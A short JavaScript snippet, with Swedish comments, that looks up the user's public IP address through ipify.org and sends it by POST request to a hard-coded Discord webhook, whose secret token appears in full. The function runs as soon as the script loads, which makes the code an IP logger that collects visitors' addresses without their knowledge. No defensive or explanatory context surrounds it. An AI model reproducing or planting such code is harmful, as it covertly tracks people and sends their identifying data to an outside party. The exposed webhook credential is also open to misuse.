async function fetchIpAndSend() {
  const response = await fetch('https://api.ipify.org?format=json');
  const data = await response.json();

  // Ange din webhook-URL här
  const webhookUrl = 'https://discord.com/api/webhooks/1462691033262587924/iepbH-gkjpY5av_nIxy6mZbqpbDsyB4wirdHuj75U8Sp1gKZub0IXZbm8b1HnUjfemX7';

  // Skicka IP till webhook
  await fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ ip: data.ip })
  });
}

// Anropa funktionen när du vill
fetchIpAndSend();
